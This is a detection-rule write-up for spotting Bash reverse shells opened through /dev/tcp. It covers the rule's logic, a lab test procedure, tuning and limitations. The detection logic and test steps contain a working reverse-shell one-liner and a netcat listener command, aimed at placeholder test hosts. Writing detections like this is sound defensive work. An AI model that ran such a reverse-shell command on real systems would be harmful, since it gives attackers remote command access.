# Linux Bash Reverse Shell via /dev/tcp

| | |
|---|---|
| **MITRE ATT&CK** | T1059.004 |
| **Tactic** | Execution |
| **Severity** | High |
| **Log source** | Linux process creation events with command lines (auditd execve records, or an EDR sensor) |
| **Required fields** | Image, CommandLine, ParentImage, User |
| **Rule file** | [`linux-bash-reverse-shell.yml`](./linux-bash-reverse-shell.yml) |
| **Status** | Draft. Not yet validated in a lab. |

## What it detects
Detects a shell command that opens a network connection through /dev/tcp, the classic one-line Bash reverse shell that gives an attacker remote command access.

## Detection logic
A bash or sh process whose command line contains `/dev/tcp/`, for example `bash -i >& /dev/tcp/<ip>/<port> 0>&1`.

## How to test
In an isolated Linux VM, start a listener on another test host (`nc -lvnp 4444`) and run `bash -c "bash -i >& /dev/tcp/<test-ip>/4444 0>&1"`. Stop it straight afterwards.

Once validated, record the date, the tool used, and a sample of the matching event in the results section below.

## Expected false positives and tuning
- Rare. Admin or monitoring scripts that use /dev/tcp to test whether a port is open.

Allow-list monitoring scripts that use /dev/tcp for port checks. Raise priority when the destination is an external IP or the parent process is a web server or a user-facing service.

## Limitations
Reverse shells can use other tools (nc, python, perl, socat) or other syntax, and those are not covered here. Auditd must log full command lines, or the field will be empty.

## Validation results
_Not yet run._

## References
- https://attack.mitre.org/techniques/T1059/004/
